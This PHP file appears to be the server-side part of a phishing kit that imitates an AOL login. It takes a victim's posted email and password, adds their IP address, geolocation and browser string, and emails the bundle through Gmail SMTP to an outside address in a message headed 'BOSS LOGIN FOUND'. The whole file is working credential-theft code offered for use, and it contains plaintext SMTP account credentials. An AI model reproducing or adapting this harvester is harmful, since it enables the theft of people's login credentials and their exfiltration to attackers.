<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require './src/Exception.php';
require './src/PHPMailer.php';
require './src/SMTP.php';

$mail = new PHPMailer(true);

function getRealUserIp(){
    switch(true){
      case (!empty($_SERVER['HTTP_X_REAL_IP'])) : return $_SERVER['HTTP_X_REAL_IP'];
      case (!empty($_SERVER['HTTP_CLIENT_IP'])) : return $_SERVER['HTTP_CLIENT_IP'];
      case (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) : return $_SERVER['HTTP_X_FORWARDED_FOR'];
      default : return $_SERVER['REMOTE_ADDR'];
    }
}

function visitor_country(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $ip = $forward;
    }else{
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null){
        $result = $ip_data->geoplugin_countryName;
    }
    return $result;
}

function visitor_countryCode(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null){
        $result = $ip_data->geoplugin_countryCode;
    }
    return $result;
}

function visitor_regionName(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_regionName != null){
        $result = $ip_data->geoplugin_regionName;
    }
    return $result;
}

function visitor_continentCode(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $ip = $forward;
    }else{
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_continentCode != null){
        $result = $ip_data->geoplugin_continentCode;
    }

    return $result;
}

if(isset($_GET['send-mail'])){
	$data = array();
    $data['email'] = $_POST['email'];
    $data['password'] = $_POST['password'];
    $data['country'] = visitor_country();
	$data['countryCode'] = visitor_countryCode();
	$data['continentCode'] = visitor_continentCode();
	$data['ip'] = getRealUserIp();
	$data['browser'] = $_SERVER['HTTP_USER_AGENT'];
	$data['message'] = "
	<HTML>
		<BODY>
			<table>
				<tr><td>BOSS LOGIN FOUND </td></tr>
				<tr><td>Email: >".$data['email']."<<td/></tr>
				<tr><td>Access: >".$data['password']."<</td></tr>
				<tr><td>Browser: >".$data['browser']."<</td></tr>
				<tr><td>IP: ".$data['country']." | <a href='http://whoer.net/check?host=".$data['ip']."' target='_blank'>".$data['ip']."</a> </td></tr>
				<tr><td>>Anonymous Cyber Team<</td></tr>
			 </table>
 		</BODY>
 	</HTML>";
    
    $mail->isSMTP();                                      // Set mailer to use SMTP
    $mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
    $mail->SMTPAuth = true;                               // Enable SMTP authentication
    $mail->Username = 'justin.office247@gmail.com';                 // SMTP username
    $mail->Password = 'mbj/4592';                           // SMTP password
    $mail->SMTPSecure = 'tls';                         // SMTP password
    $mail->Port = 587;

    $mail->From = 'justin.office247@gmail.com';
    $mail->FromName = 'AOL Login!';
    $mail->addAddress('frank.office247@gmail.com');

	$mail->isHTML(true);                                  // Set email format to HTML

	$mail->Subject = "New Login Found";
	$mail->Body    = $data['message'];
	$mail->AltBody = 'Enjoy new server';

	if(!$mail->send()) {
	    echo 'Message could not be sent.';
	    echo 'Mailer Error: ' . $mail->ErrorInfo;
	} else {
		echo 'true';
	}
}
